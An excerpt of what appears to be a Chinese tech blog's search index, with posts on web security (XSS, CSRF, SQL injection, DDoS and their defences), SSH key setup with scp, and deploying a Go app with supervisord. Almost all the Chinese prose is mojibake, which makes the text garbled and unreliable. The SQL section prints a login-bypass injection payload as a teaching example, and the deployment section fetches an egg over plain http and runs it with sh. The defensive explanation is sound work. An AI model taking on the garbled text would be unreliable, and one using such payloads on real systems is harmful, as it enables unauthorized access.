æœåŠ¡å™¨è¾“å‡ºæ£€æŸ¥\n\n  ä¸€èˆ¬æ¥è¯´ï¼Œé™¤å¯Œæ–‡æœ¬çš„è¾“å‡ºå¤–ï¼Œåœ¨æœåŠ¡å™¨å˜é‡è¾“å‡ºåˆ° HTML é¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡ XSS æ”»å‡»ã€‚ä¾‹å¦‚åˆ©ç”¨ sanitize-html å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œæœ‰è§„åˆ™çš„è¿‡æ»¤ä¹‹åå†è¾“å‡ºåˆ°é¡µé¢ä¸­ã€‚\n  \n  \n\n# 2. CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ ,è½åœ¨è¯·æ±‚)\n\nCSRFï¼Œå³ Cross Site Request Forgeryï¼Œä¸­è¯‘æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§åŠ«æŒå—ä¿¡ä»»ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€éé¢„æœŸè¯·æ±‚çš„æ”»å‡»æ–¹å¼ã€‚\n\né€šå¸¸æƒ…å†µä¸‹ï¼ŒCSRF æ”»å‡»æ˜¯æ”»å‡»è€…å€ŸåŠ©å—å®³è€…çš„ Cookie éª—å–æœåŠ¡å™¨çš„ä¿¡ä»»ï¼Œå¯ä»¥åœ¨å—å®³è€…æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…åä¹‰ä¼ªé€ è¯·æ±‚å‘é€ç»™å—æ”»å‡»æœåŠ¡å™¨ï¼Œä»è€Œåœ¨å¹¶æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œåœ¨æƒé™ä¿æŠ¤ä¹‹ä¸‹çš„æ“ä½œã€‚\n\n### 2.1 é˜²èŒƒ\n\n+ éªŒè¯ç \n\n  CSRF æ”»å‡»å¾€å¾€æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ äº†ç½‘ç»œè¯·æ±‚ã€‚è€ŒéªŒè¯ç ä¼šå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨è¿›è¡Œäº¤äº’ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚ã€‚å› ä¸ºé€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¤Ÿå¾ˆå¥½åœ°éåˆ¶ CSRF æ”»å‡»ã€‚\n\n+ Referer Check\n\n  æ ¹æ® HTTP åè®®ï¼Œåœ¨ HTTP å¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå« Refererï¼Œå®ƒè®°å½•äº†è¯¥ HTTP è¯·æ±‚çš„æ¥æºåœ°å€ã€‚é€šè¿‡ Referer Checkï¼Œå¯ä»¥æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„\"æº\"ã€‚\n\n  Referer Check ä¸ä»…èƒ½é˜²èŒƒ CSRF æ”»å‡»ï¼Œå¦ä¸€ä¸ªåº”ç”¨åœºæ™¯æ˜¯ \"é˜²æ­¢å›¾ç‰‡ç›—é“¾\"ã€‚\n\n+ æ·»åŠ  token éªŒè¯\n\n  è¦æŠµå¾¡ CSRFï¼Œå…³é”®åœ¨äºåœ¨è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…æ‰€ä¸èƒ½ä¼ªé€ çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥ä¿¡æ¯ä¸å­˜åœ¨äº Cookie ä¹‹ä¸­ã€‚å¯ä»¥åœ¨ HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ª tokenï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚\n\n  \n\n# 3. SQL æ³¨å…¥\n\nsqlæ³¨å…¥çš„åŸç†æ˜¯å°†sqlä»£ç ä¼ªè£…åˆ°è¾“å…¥å‚æ•°ä¸­ï¼Œä¼ é€’åˆ°æœåŠ¡å™¨è§£æå¹¶æ‰§è¡Œçš„ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€äº›å¯¹serverç«¯å‘èµ·çš„è¯·æ±‚å‚æ•°ä¸­æ¤å…¥ä¸€äº›sqlä»£ç ï¼Œserverç«¯åœ¨æ‰§è¡Œsqlæ“ä½œæ—¶ï¼Œä¼šæ‹¼æ¥å¯¹åº”å‚æ•°ï¼ŒåŒæ—¶ä¹Ÿå°†ä¸€äº›sqlæ³¨å…¥æ”»å‡»çš„â€œsqlâ€æ‹¼æ¥èµ·æ¥ï¼Œå¯¼è‡´ä¼šæ‰§è¡Œä¸€äº›é¢„æœŸä¹‹å¤–çš„æ“ä½œã€‚\n\n### 3.1 ä¸¾ä¾‹\n\n```sql\nsql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\"\n```\n\nå¦‚æœç”¨æˆ·çš„è¾“å…¥çš„ç”¨æˆ·åå¦‚ä¸‹ï¼Œå¯†ç ä»»æ„\n\n```sql\nmyuser' or 'foo' = 'foo' --\n```\n\né‚£ä¹ˆæˆ‘ä»¬çš„SQLå˜æˆäº†å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```sql\nSELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'\n```\n\nåœ¨SQLé‡Œé¢`--`æ˜¯æ³¨é‡Šæ ‡è®°ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥ä¼šåœ¨æ­¤ä¸­æ–­ã€‚è¿™å°±è®©æ”»å‡»è€…åœ¨ä¸çŸ¥é“ä»»ä½•åˆæ³•ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹æˆåŠŸç™»å½•äº†ã€‚\n\n### 3.2 é˜²èŒƒ\n\n+ ä¸¥æ ¼é™åˆ¶Webåº”ç”¨çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æœ€ä½æƒé™ï¼Œä»è€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚\n\n+ æ£€æŸ¥è¾“å…¥çš„æ•°æ®æ˜¯å¦å…·æœ‰æ‰€æœŸæœ›çš„æ•°æ®æ ¼å¼ï¼Œä¸¥æ ¼é™åˆ¶å˜é‡çš„ç±»å‹ï¼Œä¾‹å¦‚ä½¿ç”¨regexpåŒ…è¿›è¡Œä¸€äº›åŒ¹é…å¤„ç†ï¼Œæˆ–è€…ä½¿ç”¨strconvåŒ…å¯¹å­—ç¬¦ä¸²è½¬åŒ–æˆå…¶ä»–åŸºæœ¬ç±»å‹çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ã€‚\n\n+ å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ'\"\\å°–æ‹¬å·&*;ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚Go çš„`text/template`åŒ…é‡Œé¢çš„`HTMLEscapeString`å‡½æ•°å¯ä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚\n\n+ æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥å»ºè®®ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°SQLè¯­å¥ä¸­ï¼Œå³ä¸è¦ç›´æ¥æ‹¼æ¥SQLè¯­å¥ã€‚ä¾‹å¦‚ä½¿ç”¨`database/sql`é‡Œé¢çš„æŸ¥è¯¢å‡½æ•°`Prepare`å’Œ`Query`ï¼Œæˆ–è€…`Exec(query string, args ...interface{})`ã€‚\n\n+ åœ¨åº”ç”¨å‘å¸ƒä¹‹å‰å»ºè®®ä½¿ç”¨ä¸“ä¸šçš„SQLæ³¨å…¥æ£€æµ‹å·¥å…·è¿›è¡Œæ£€æµ‹ï¼Œä»¥åŠæ—¶ä¿®è¡¥è¢«å‘ç°çš„SQLæ³¨å…¥æ¼æ´ã€‚ç½‘ä¸Šæœ‰å¾ˆå¤šè¿™æ–¹é¢çš„å¼€æºå·¥å…·ï¼Œä¾‹å¦‚sqlmapã€SQLninjaç­‰ã€‚\n\n+ é¿å…ç½‘ç«™æ‰“å°å‡ºSQLé”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»å‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼ŒæŠŠä»£ç é‡Œçš„SQLè¯­å¥æš´éœ²å‡ºæ¥ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡ŒSQLæ³¨å…¥ã€‚\n\n\n\n# 4. DDos æ”»å‡»\n\n Distributed Denial of Serviceï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡ã€‚ä¸€èˆ¬æ¥è¯´æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨â€œè‚‰é¸¡â€å¯¹ç›®æ ‡ç½‘ç«™åœ¨è¾ƒçŸ­çš„æ—¶é—´å†…å‘èµ·å¤§é‡è¯·æ±‚ï¼Œå¤§è§„æ¨¡æ¶ˆè€—ç›®æ ‡ç½‘ç«™çš„ä¸»æœºèµ„æºï¼Œè®©å®ƒæ— æ³•æ­£å¸¸æœåŠ¡ã€‚åœ¨çº¿æ¸¸æˆã€äº’è”ç½‘é‡‘èç­‰é¢†åŸŸæ˜¯ DDoS æ”»å‡»çš„é«˜å‘è¡Œä¸šã€‚\n\n### 4.1 ä¸¾ä¾‹\n\n+ SYN Flood æ”»å‡»\n\n  SYN Flood å°±æ˜¯ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€æŠ¥æ–‡åçªç„¶æ­»æœºæˆ–æ‰çº¿ï¼Œé‚£ä¹ˆæœåŠ¡å™¨åœ¨å‘å‡ºåº”ç­”æŠ¥æ–‡åå°±æ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯çš„ç¡®è®¤æŠ¥æ–‡ï¼ˆç¬¬ä¸‰æ¬¡æ¡æ‰‹æ— æ³•å®Œæˆï¼‰ï¼Œè¿™æ—¶æœåŠ¡å™¨ç«¯ä¸€èˆ¬ä¼šé‡è¯•å¹¶ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼ˆè‡³å°‘ 30sï¼‰åå†ä¸¢å¼ƒè¿™ä¸ªæœªå®Œæˆçš„è¿æ¥ã€‚\n\n  ä¸€ä¸ªç”¨æˆ·å‡ºç°å¼‚å¸¸å¯¼è‡´æœåŠ¡å™¨çš„ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…ä¸€ä¼šå„¿å¹¶ä¸æ˜¯å¤§é—®é¢˜ï¼Œä½†æ¶æ„æ”»å‡»è€…å¤§é‡æ¨¡æ‹Ÿï¼ˆæ„é€ æº IP å»å‘é€ SYN åŒ…ï¼‰è¿™ç§æƒ…å†µï¼ŒæœåŠ¡å™¨ç«¯ä¸ºäº†ç»´æŠ¤æ•°ä»¥ä¸‡è®¡çš„åŠè¿æ¥è€Œæ¶ˆè€—éå¸¸å¤šçš„èµ„æºï¼Œç»“æœå¾€å¾€æ˜¯æ— æš‡ç†ç¬æ­£å¸¸å®¢æˆ·çš„è¯·æ±‚ï¼Œç”šè‡³å´©æºƒã€‚ä»æ­£å¸¸å®¢æˆ·çš„è§’åº¦çœ‹æ¥ï¼Œç½‘ç«™å¤±å»äº†å“åº”ï¼Œæ— æ³•è®¿é—®ã€‚\n\n+ CC æ”»å‡»\n\n  CC æ”»å‡»çš„åŸç†å°±æ˜¯å€ŸåŠ©ä»£ç†æœåŠ¡å™¨é’ˆå¯¹ç›®æ ‡ç³»ç»Ÿçš„æ¶ˆè€—èµ„æºæ¯”è¾ƒå¤§çš„é¡µé¢ä¸æ–­å‘èµ·æ­£å¸¸çš„è¯·æ±‚ï¼Œé€ æˆå¯¹æ–¹æœåŠ¡å™¨èµ„æºè€—å°½ï¼Œä¸€ç›´åˆ°å®•æœºå´©æºƒã€‚å› æ­¤åœ¨å‘é€ CC æ”»å‡»å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾åŠ è½½æ¯”è¾ƒæ…¢ï¼Œæ¶ˆè€—èµ„æºæ¯”è¾ƒå¤šçš„ç½‘é¡µã€‚æ¯”å¦‚ï¼šéœ€è¦æŸ¥è¯¢æ•°æ®åº“çš„é¡µé¢ã€è¯»å†™ç¡¬ç›˜çš„æ–‡ä»¶ç­‰ã€‚ç›¸æ¯”å…¶å®ƒçš„ DDoS æ”»å‡» CC æ›´æœ‰æŠ€æœ¯å«é‡ä¸€äº›ï¼Œè¿™ç§æ”»å‡»ä½ è§ä¸åˆ°çœŸå®æº IPã€‚è§ä¸åˆ°ç‰¹åˆ«å¤§çš„å¼‚å¸¸æµé‡ï¼Œä½†é€ æˆæœåŠ¡å™¨æ— æ³•è¿›è¡Œæ­£å¸¸è¿æ¥ã€‚\n\n### 4.2 é˜²èŒƒ\n\n**1ã€é‡‡ç”¨é«˜æ€§èƒ½çš„ç½‘ç»œè®¾å¤‡**\n\né¦–å…ˆéœ€è¦ä¿è¯è·¯ç”±å™¨ã€äº¤æ¢æœºã€ç¡¬ä»¶é˜²ç«å¢™ç­‰ç½‘ç»œè®¾å¤‡çš„æ€§èƒ½ï¼Œå½“å‘ç”ŸDDoSæ”»å‡»çš„æ—¶å€™ï¼Œç”¨è¶³å¤Ÿæ€§èƒ½çš„æœºå™¨ã€å®¹é‡å»æ‰¿å—æ”»å‡»ï¼Œå……åˆ†åˆ©ç”¨ç½‘ç»œè®¾å¤‡ä¿æŠ¤ç½‘ç»œèµ„æºæ˜¯ååˆ†æœ‰æ•ˆçš„åº”å¯¹ç­–ç•¥ã€‚\n\n**2ã€ä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„å®‰å…¨**\n\né¦–å…ˆè¦ç¡®ä¿æœåŠ¡å™¨è½¯ä»¶æ²¡æœ‰ä»»ä½•æ¼æ´ï¼Œé˜²æ­¢æ”»å‡»è€…å…¥ä¾µã€‚ç¡®ä¿æœåŠ¡å™¨é‡‡ç”¨æœ€æ–°ç³»ç»Ÿï¼Œå¹¶æ‰“ä¸Šå®‰å…¨è¡¥ä¸ã€‚åœ¨æœåŠ¡å™¨ä¸Šåˆ é™¤æœªä½¿ç”¨çš„æœåŠ¡ï¼Œå…³é—­æœªä½¿ç”¨çš„ç«¯å£ã€‚å¯¹äºæœåŠ¡å™¨ä¸Šè¿è¡Œçš„ç½‘ç«™ï¼Œç¡®ä¿å…¶æ‰“äº†æœ€æ–°çš„è¡¥ä¸ï¼Œæ²¡æœ‰å®‰å…¨æ¼æ´ã€‚\n\n**3ã€å……è¶³çš„ç½‘ç»œå¸¦å®½ä¿è¯**\n\nç½‘ç»œå¸¦å®½ç›´æ¥å†³å®šäº†èƒ½æŠ—å—æ”»å‡»çš„èƒ½åŠ›ï¼Œå‡è‹¥ä»…ä»…æœ‰10Må¸¦å®½çš„è¯ï¼Œæ— è®ºé‡‡å–ä»€ä¹ˆæªæ–½éƒ½å¾ˆéš¾å¯¹æŠ—ç°åœ¨çš„SYNFloodæ”»å‡»ï¼Œå½“å‰è‡³å°‘è¦é€‰æ‹©100Mçš„å…±äº«å¸¦å®½ï¼Œæœ€å¥½çš„å½“ç„¶æ˜¯æŒ‚åœ¨1000Mçš„ä¸»å¹²ä¸Šäº†ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸»æœºä¸Šçš„ç½‘å¡æ˜¯1000Mçš„å¹¶ä¸æ„å‘³ç€å®ƒçš„ç½‘ç»œå¸¦å®½å°±æ˜¯åƒå…†çš„ï¼Œè‹¥æŠŠå®ƒæ¥åœ¨100Mçš„äº¤æ¢æœºä¸Šï¼Œå®ƒçš„å®é™…å¸¦å®½ä¸ä¼šè¶…è¿‡100Mï¼Œå†å°±æ˜¯æ¥åœ¨100Mçš„å¸¦å®½ä¸Šä¹Ÿä¸ç­‰äºå°±æœ‰äº†ç™¾å…†çš„å¸¦å®½ï¼Œå› ä¸ºç½‘ç»œæœåŠ¡å•†å¾ˆå¯èƒ½ä¼šåœ¨äº¤æ¢æœºä¸Šé™åˆ¶å®é™…å¸¦å®½ä¸º10Mï¼Œè¿™ç‚¹ä¸€å®šè¦ææ¸…æ¥šã€‚\n\n**4ã€æŠŠç½‘ç«™åšæˆé™æ€é¡µé¢æˆ–è€…ä¼ªé™æ€**\n\nå¤§é‡äº‹å®è¯æ˜ï¼ŒæŠŠç½‘ç«™å°½å¯èƒ½åšæˆé™æ€é¡µé¢ï¼Œä¸ä»…èƒ½å¤§å¤§æé«˜æŠ—æ”»å‡»èƒ½åŠ›ï¼Œè€Œä¸”è¿˜ç»™é»‘å®¢å…¥ä¾µå¸¦æ¥ä¸å°‘éº»çƒ¦ï¼Œè‡³å°‘åˆ°ç°åœ¨ä¸ºæ­¢å…³äºHTMLçš„æº¢å‡ºè¿˜æ²¡å‡ºç°ã€‚å¦‚æœééœ€è¦åŠ¨æ€è„šæœ¬è°ƒç”¨ï¼Œé‚£å°±æŠŠå®ƒå¼„åˆ°å¦å¤–ä¸€å°å•ç‹¬ä¸»æœºå»ï¼Œå…çš„é­å—æ”»å‡»æ—¶è¿ç´¯ä¸»æœåŠ¡å™¨ï¼Œå½“ç„¶ï¼Œé€‚å½“æ”¾ä¸€äº›ä¸åšæ•°æ®åº“è°ƒç”¨è„šæœ¬è¿˜æ˜¯å¯ä»¥çš„ã€‚\n\n**5ã€å¢å¼ºæ“ä½œç³»ç»Ÿçš„TCP/IPæ ˆ**\n\nWindowsæ“ä½œç³»ç»Ÿæœ¬èº«å°±å…·å¤‡ä¸€å®šçš„æŠµæŠ—DDoSæ”»å‡»çš„èƒ½åŠ›ï¼Œåªæ˜¯é»˜è®¤çŠ¶æ€ä¸‹æ²¡æœ‰å¼€å¯è€Œå·²ï¼Œè‹¥å¼€å¯çš„è¯å¯æŠµæŒ¡çº¦10000ä¸ªSYNæ”»å‡»åŒ…ï¼Œè‹¥æ²¡æœ‰å¼€å¯åˆ™ä»…èƒ½æŠµå¾¡æ•°ç™¾ä¸ªï¼Œå…·ä½“æ€ä¹ˆå¼€å¯ï¼Œè¿˜éœ€è‡ªè¡Œå»å¾®è½¯å®˜ç½‘äº†è§£ã€‚\n\n**6ã€HTTP è¯·æ±‚çš„æ‹¦æˆª**\n\nHTTP è¯·æ±‚çš„ç‰¹å¾ä¸€èˆ¬æœ‰ä¸¤ç§ï¼šIP åœ°å€å’Œ User Agent å­—æ®µã€‚æ¯”å¦‚ï¼Œæ¶æ„è¯·æ±‚éƒ½æ˜¯ä»æŸä¸ª IP æ®µå‘å‡ºçš„ï¼Œé‚£ä¹ˆæŠŠè¿™ä¸ª IP æ®µå°æ‰å°±è¡Œã€‚æˆ–è€…ï¼Œå®ƒä»¬çš„ User Agent å­—æ®µæœ‰ç‰¹å¾(åŒ…å«æŸä¸ªç‰¹å®šçš„è¯è¯­)ï¼Œé‚£å°±æŠŠå¸¦æœ‰è¿™ä¸ªè¯è¯­çš„è¯·æ±‚æ‹¦æˆªã€‚\n\n**7ã€éƒ¨ç½²CDN**\n\nCDN æŒ‡çš„æ˜¯ç½‘ç«™çš„é™æ€å†…å®¹åˆ†å‘åˆ°å¤šä¸ªæœåŠ¡å™¨ï¼Œç”¨æˆ·å°±è¿‘è®¿é—®ï¼Œæé«˜é€Ÿåº¦ã€‚å› æ­¤ï¼ŒCDN ä¹Ÿæ˜¯å¸¦å®½æ‰©å®¹çš„ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é˜²å¾¡ DDOS æ”»å‡»ã€‚\n\n**8ã€éšè—æœåŠ¡å™¨çš„çœŸå®IPåœ°å€**\n\næœåŠ¡å™¨å‰ç«¯åŠ CDNä¸­è½¬ï¼Œå¦‚æœèµ„é‡‘å……è£•çš„è¯ï¼Œå¯ä»¥è´­ä¹°é«˜é˜²çš„ç›¾æœºï¼Œç”¨äºéšè—æœåŠ¡å™¨çœŸå®IPï¼ŒåŸŸåè§£æä½¿ç”¨CDNçš„IPï¼Œæ‰€æœ‰è§£æçš„å­åŸŸåéƒ½ä½¿ç”¨CDNçš„IPåœ°å€ã€‚æ­¤å¤–ï¼ŒæœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„å…¶ä»–åŸŸåä¹Ÿä¸èƒ½ä½¿ç”¨çœŸå®IPè§£æï¼Œå…¨éƒ¨éƒ½ä½¿ç”¨CDNæ¥è§£æã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://juejin.im/post/5cef3a3bf265da1b8d160052\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md\n+ https://www.hi-linux.com/posts/50873.html","tags":["å®‰å…¨"],"categories":["Web"]},{"title":"ssh_scpå…å¯†å’ŒæœåŠ¡å™¨å»ºç«‹ä¿¡ä»»","url":"%2Fp%2Ffe0e5995.html","content":"\n+ åœ¨macä¸Šç”Ÿæˆå¯†é’¥\n\t\n\tç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶`vultr`  `vultr.pub`\n\t\n\t`ssh-keygen -t rsa`   //passphraseå¯ä»¥ä¸ºç©º\n\n+ å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨\n\n\tç¬¬ä¸€ç§æ–¹å¼: \n\t\n\t`scp ~/.ssh/vultr.pub root@207.246.80.69:/root/.ssh/authorized_keys`\n\t\n\tç¬¬äºŒç§æ–¹å¼:\n\t\n\t`ssh-copy-id -i ~/.ssh/vultr.pub root@207.246.80.69`\n\n<!-- more -->\n+ æ·»åŠ åˆ°vultrçš„ssh keyé‡Œ(è¿™ä¸€æ­¥å¯ä»¥ä¸åš)\n\n\t`https://my.vultr.com/sshkeys/`\n\n\t\n\n+ ä¸€é”®è¿æ¥åˆ°ssh\n\t\n\tå‘½ä»¤: `ssh -i ~/.ssh/vultr root@207.246.80.69`\n\n+ scp files\n\n\tå‘½ä»¤: `scp -i ~/.ssh/vultr files root@207.246.80.69:/root`\n","tags":["ssh"],"categories":["å‘½ä»¤"]},{"title":"linuxéƒ¨ç½²golangçš„æ–¹å¼","url":"%2Fp%2F8956ebfb.html","content":"\n\n### é€šè¿‡sshæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨\n\n```\nscp -i /Users/liuwei/.ssh/aws.pem -C -r /Users/liuwei/golang/src/web ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com:/home/ubuntu\n```\n\naws.pem chmod 400\n\nscp  -C åŠ ä¸€ä¸ªå¯èƒ½ä¼šæ›´å¿«\n\n### å‘è¡Œéƒ¨ç½²\n\nGo è¯­è¨€çš„åº”ç”¨æœ€åç¼–è¯‘ä¹‹åæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ åªéœ€è¦ copy è¿™ä¸ªåº”ç”¨åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿è¡Œèµ·æ¥å°±è¡Œã€‚beego ç”±äºå¸¦æœ‰å‡ ä¸ªé™æ€æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€æ¨¡æ¿æ–‡ä»¶ä¸‰ä¸ªç›®å½•ï¼Œæ‰€ä»¥ç”¨æˆ·éƒ¨ç½²çš„æ—¶å€™éœ€è¦åŒæ—¶ copy è¿™ä¸‰ä¸ªç›®å½•åˆ°ç›¸åº”çš„éƒ¨ç½²åº”ç”¨ä¹‹ä¸‹ï¼Œä¸‹é¢ä»¥æˆ‘å®é™…çš„åº”ç”¨éƒ¨ç½²ä¸ºä¾‹ï¼š\n\n<!-- more -->\n```\n$ mkdir /opt/app/beepkg\n$ cp beepkg /opt/app/beepkg\n$ cp -fr views /opt/app/beepkg\n$ cp -fr static /opt/app/beepkg\n$ cp -fr conf /opt/app/beepkg\n\n```\nè¿™æ ·åœ¨ /opt/app/beepkg ç›®å½•ä¸‹é¢å°±ä¼šæ˜¾ç¤ºå¦‚ä¸‹çš„ç›®å½•ç»“æ„ï¼š\n\n```\n.\nâ”œâ”€â”€ conf\nâ”‚   â”œâ”€â”€ app.conf\nâ”œâ”€â”€ static\nâ”‚   â”œâ”€â”€ css\nâ”‚   â”œâ”€â”€ img\nâ”‚   â””â”€â”€ js\nâ””â”€â”€ views\n    â””â”€â”€ index.tpl\nâ”œâ”€â”€ beepkg\n\n```\nè¿™æ ·æˆ‘ä»¬å°±å·²ç»æŠŠæˆ‘ä»¬éœ€è¦çš„åº”ç”¨æ¬åˆ°æœåŠ¡å™¨äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹éƒ¨ç½²äº†ã€‚\n\nå°±æ˜¯ä¸€å…±ä¸Šä¼ 3ä¸ªæ–‡ä»¶å¤¹å’Œ1ä¸ªå¯æ‰§è¡Œæ–‡ä»¶\n\n### 1. ç‹¬ç«‹éƒ¨ç½²\nåœ¨ linux ä¸‹é¢éƒ¨ç½²ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ nohup å‘½ä»¤ï¼ŒæŠŠåº”ç”¨éƒ¨ç½²åœ¨åç«¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\nnohup ./beepkg &\n```\nè¿™æ ·ä½ çš„åº”ç”¨å°±è·‘åœ¨äº† Linux ç³»ç»Ÿçš„å®ˆæŠ¤è¿›ç¨‹\n\n\n\n### 2. supervisord ç®¡ç†\nsupervisord æ˜¯ç”¨ Python å®ç°çš„ä¸€æ¬¾éå¸¸å®ç”¨çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œsupervisord è¿˜è¦æ±‚ç®¡ç†çš„ç¨‹åºæ˜¯é daemon ç¨‹åºï¼Œsupervisord ä¼šå¸®ä½ æŠŠå®ƒè½¬æˆ daemon ç¨‹åºï¼Œå› æ­¤å¦‚æœç”¨ supervisord æ¥ç®¡ç† nginx çš„è¯ï¼Œå¿…é¡»åœ¨ nginx çš„é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä¸€è¡Œè®¾ç½® daemon off è®© nginx ä»¥é daemon æ–¹å¼å¯åŠ¨ã€‚\n\n1. å®‰è£… setuptools\n\n```\nwget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg\nsh setuptools-0.6c11-py2.7.egg\neasy_install supervisor\necho_supervisord_conf >/etc/supervisord.conf\nmkdir /etc/supervisord.conf.d\n```\n\n2. ä¿®æ”¹é…ç½® /etc/supervisord.conf\n\n```\n[include]\nfiles = /etc/supervisord.conf.d/*.conf\n```\n\n3. æ–°å»ºç®¡ç†çš„åº”ç”¨\ncd /etc/supervisord.conf.d\nvim beepkg.conf\né…ç½®æ–‡ä»¶ï¼š\n\n```\n[program:beepkg]\ndirectory = /opt/app/beepkg\ncommand = /opt/app/beepkg/beepkg\nautostart = true\nstartsecs = 5\nuser = root\nredirect_stderr = true\nstdout_logfile = /var/log/supervisord/beepkg.log\n```\n\n##### supervisord ç®¡ç†\n\nsupervisord å®‰è£…å®Œæˆåæœ‰ä¸¤ä¸ªå¯ç”¨çš„å‘½ä»¤è¡Œ supervisord å’Œ supervisorctlï¼Œå‘½ä»¤ä½¿ç”¨è§£é‡Šå¦‚ä¸‹ï¼š\n\n  â— supervisordï¼Œåˆå§‹å¯åŠ¨ Supervisordï¼Œå¯åŠ¨ã€ç®¡ç†é…ç½®ä¸­è®¾ç½®çš„è¿›ç¨‹ã€‚\n\n  â— supervisorctl stop programxxxï¼Œåœæ­¢æŸä¸€ä¸ªè¿›ç¨‹(programxxx)ï¼Œprogramxxx ä¸º [program:beepkg] é‡Œé…ç½®çš„å€¼ï¼Œè¿™ä¸ªç¤ºä¾‹å°±æ˜¯ beepkgã€‚\n\n  â— supervisorctl start programxxxï¼Œå¯åŠ¨æŸä¸ªè¿›ç¨‹\n\n  â— supervisorctl restart programxxxï¼Œé‡å¯æŸä¸ªè¿›ç¨‹\n\n  â— supervisorctl stop groupworker: ï¼Œé‡å¯æ‰€æœ‰å±äºåä¸º groupworker è¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹(start,restart åŒç†)\n\n  â— supervisorctl stop allï¼Œåœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stop éƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ã€‚\n\n  â— supervisorctl 